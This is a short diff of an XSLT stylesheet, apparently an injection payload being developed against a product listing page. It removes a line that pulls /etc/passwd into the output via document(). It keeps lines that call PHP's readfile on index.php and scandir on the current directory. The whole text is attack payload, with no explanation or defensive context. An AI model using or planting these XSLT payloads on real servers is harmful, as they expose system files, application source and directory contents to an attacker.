@@ -6,7 +6,6 @@
           <xsl:value-of select="name" /> -
         </span>
         <xsl:value-of select="price" />
-        <xsl:copy-of select="document('/etc/passwd')"/>
         <xsl:value-of select="php:function('readfile','index.php')" />
         <xsl:value-of select="php:function('scandir','./')"/>
       </div>
